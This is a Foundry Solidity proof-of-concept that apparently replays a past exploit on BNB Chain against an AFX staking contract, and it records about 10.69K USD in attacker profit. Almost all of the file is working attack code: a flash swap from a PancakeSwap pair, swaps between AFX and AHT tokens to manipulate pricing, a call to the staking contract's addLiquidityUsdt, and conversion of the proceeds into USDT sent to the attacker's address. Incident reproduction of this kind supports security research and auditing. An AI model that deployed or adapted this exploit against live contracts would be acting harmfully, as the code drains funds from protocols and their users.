// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : N/A
// Attacker : 0x236f08d8962e1f29700e3d91009bfa8d37d71e53
// Attack Contract : 0x129b803f5e8e36e2d6e705d84bbe7995b02fc0cb
// Vulnerable Contract : 0x129b803f5e8e36e2d6e705d84bbe7995b02fc0cb
// Attack Tx : 0x380cd298a607d4422edc640b7f5a907ec0792841ee5fc963d265b1189397c905
// Block : 80395411
// Chain : BSC
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 10.69K USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 80395410;
    uint256 constant TX_TIMESTAMP = 1770723563;
    uint256 constant TX_BLOCK_NUMBER = 80395411;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        AttackContract attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        bytes memory entryData = abi.encodeWithSelector(
            bytes4(0x98552476), Addresses.Cake_LP, Addresses.AFX, Addresses.afxStakeDappA, Addresses.AHT
        );
        (bool ok, bytes memory result) = address(attack).call{value: TX_VALUE}(entryData);
        if (!ok) assembly { revert(add(result, 32), mload(result)) }
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (AttackContract attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchRuntime();
            attack = AttackContract(payable(ATTACK_CONTRACT));
        } else {
            attack = new AttackContract();
        }
    }

    function _prepareProfit(AttackContract attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _etchRuntime() internal {
        // Exact-address runtime for the attacker entry and callback surfaces.
        vm.etch(ATTACK_CONTRACT, type(AttackContract).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDT, "USDT", 10699618671790673809279);
        _expectProfit(Addresses.A_954920_935D, address(0), Addresses.USDT, "USDT", 15);
        _expectProfit(Addresses.A_954920_935D, address(0), Addresses.Cake_LP_4CE0, "Cake-LP", 2506698251089645338641);
        _expectProfit(Addresses.A_954920_935D, address(0), Addresses.Cake_LP_5D46, "Cake-LP", 252);
    }
}

contract AttackContract {
    function attack() external payable {
        bytes memory callbackPayload = abi.encode(Addresses.AFX, Addresses.afxStakeDappA, Addresses.AHT);
        IUniswapV2PairLike(Addresses.Cake_LP).swap(1130500000000000000000000, 0, address(this), callbackPayload);
        IERC20Like(Addresses.AFX).balanceOf(address(this));
        uint256 swapAmountIn = 508045008843628639665017;
        if (IERC20Like(Addresses.AFX).allowance(address(this), Addresses.PancakeRouter) < swapAmountIn) {
            IERC20Like(Addresses.AFX).approve(Addresses.PancakeRouter, type(uint256).max);
        }
        IPancakeRouter(Addresses.PancakeRouter)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                swapAmountIn, 0, _addressArray2(Addresses.AFX, Addresses.USDT), Addresses.attacker_eoa, 1770723563
            );
    }

    function flashCallback() internal {
        _callbackDone[FLASH_CALLBACK_DONE] = true;
        IERC20Like(Addresses.USDT).approve(Addresses.afxStakeDappA, type(uint256).max);
        IERC20Like(Addresses.USDT).approve(Addresses.PancakeRouter, type(uint256).max);
        IERC20Like(Addresses.AFX).approve(Addresses.PancakeRouter, type(uint256).max);
        IERC20Like(Addresses.AHT).approve(Addresses.PancakeRouter, type(uint256).max);
        IERC20Like(Addresses.AFX).balanceOf(Addresses.A_146933_753C);
        uint256 afxLiquiditySeed = 511965516492998991426107;
        IERC20Like(Addresses.AFX).transfer(Addresses.A_671CE4_E227, afxLiquiditySeed);
        IERC20Like(Addresses.AFX).balanceOf(address(this));
        _swapAfxToAht();
        if (Addresses.afxStakeDappA.code.length != 0) {
            IafxStakeDappA(Addresses.afxStakeDappA).addLiquidityUsdt(100);
        } else {
            console2.log("PoCWarning", "skipping missing-code addLiquidityUsdt target");
        }
        IERC20Like(Addresses.AHT).balanceOf(address(this));
        _swapAhtToAfx();
        IERC20Like(Addresses.AFX).transfer(Addresses.Cake_LP, 1133337555000000000000000);
    }

    function attackerEntry() internal {
        _swapCakePair();
        _swapAfxToUsdt();
    }

    function _swapCakePair() internal {
        bytes memory callbackPayload = abi.encode(Addresses.AFX, Addresses.afxStakeDappA, Addresses.AHT);
        IUniswapV2PairLike(Addresses.Cake_LP).swap(1130500000000000000000000, 0, address(this), callbackPayload);
    }

    function _swapAfxToAht() internal {
        uint256 swapAmountIn = 618534483507001008573893;
        if (IERC20Like(Addresses.AFX).allowance(address(this), Addresses.PancakeRouter) < swapAmountIn) {
            IERC20Like(Addresses.AFX).approve(Addresses.PancakeRouter, type(uint256).max);
        }
        IPancakeRouter(Addresses.PancakeRouter)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                swapAmountIn, 0, _addressArray2(Addresses.AFX, Addresses.AHT), address(this), 1770723563
            );
    }

    function _swapAhtToAfx() internal {
        uint256 swapAmountIn = 26158046362735742753183;
        if (IERC20Like(Addresses.AHT).allowance(address(this), Addresses.PancakeRouter) < swapAmountIn) {
            IERC20Like(Addresses.AHT).approve(Addresses.PancakeRouter, type(uint256).max);
        }
        IPancakeRouter(Addresses.PancakeRouter)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                swapAmountIn, 0, _addressArray2(Addresses.AHT, Addresses.AFX), address(this), 1770723563
            );
    }

    function _swapAfxToUsdt() internal {
        IERC20Like(Addresses.AFX).balanceOf(address(this));
        uint256 swapAmountIn = 508045008843628639665017;
        if (IERC20Like(Addresses.AFX).allowance(address(this), Addresses.PancakeRouter) < swapAmountIn) {
            IERC20Like(Addresses.AFX).approve(Addresses.PancakeRouter, type(uint256).max);
        }
        IPancakeRouter(Addresses.PancakeRouter)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                swapAmountIn, 0, _addressArray2(Addresses.AFX, Addresses.USDT), Addresses.attacker_eoa, 1770723563
            );
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0x84800812) {
            if (!_callbackDone[FLASH_CALLBACK_DONE]) flashCallback();
            return;
        }
        if (msg.sig == 0x98552476) {
            attackerEntry();
            return;
        }
    }

    bytes32 private constant FLASH_CALLBACK_DONE = keccak256("poc.flashCallback.done");
    mapping(bytes32 => bool) private _callbackDone;

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant Cake_LP = 0x01B3beeea8D6892E4dd9f9cFE8045e49889Eb489;
    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant attack_contract = 0x129b803F5E8e36e2d6e705D84BBe7995b02FC0CB;
    address internal constant A_146933_753C = 0x146933F2692F5fF3b62441AB3C2a65dDCAca753c;
    address internal constant attacker_eoa = 0x236f08d8962e1F29700e3D91009bfa8D37D71e53;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant afxStakeDappA = 0x560d3973EE82a318d381c49fcbF3ce9d6CF1250B;
    address internal constant Cake_LP_4CE0 = 0x63e97b4f292b6Cd059fc5F7621291c7ad5B94CE0;
    address internal constant A_671CE4_E227 = 0x671Ce4928E4Ddd6c299408038D7F4Cbb1944E227;
    address internal constant A_954920_935D = 0x9549204b3cD360BA458C93f4CF4BA909bA8D935D;
    address internal constant Cake_LP_5D46 = 0x9D2D5cc00c8cF233aEFD8A177b904f8D3abb5d46;
    address internal constant AFX = 0xb6761B4D7b913EF048c92E3bb1305883422e819a;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant AHT = 0xCD1eC887b081CfBA30C8003e8Ad1b67F92236C7B;
    address internal constant KING = 0xD06C2239D204e30Cb77A34eFb17037761D26E495;
    address internal constant A_D79EA2_1289 = 0xd79eA2b6F12f5BbAf2173fae2df5071ED99C1289;
    address internal constant A_EED8F8_CEED = 0xeeD8F881160E8c3ce8BF3Fe54a95c0950276CEEd;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] calldata,
        address,
        uint256
    ) external;
}

interface IafxStakeDappA {
    function addLiquidityUsdt(uint256) external;
}
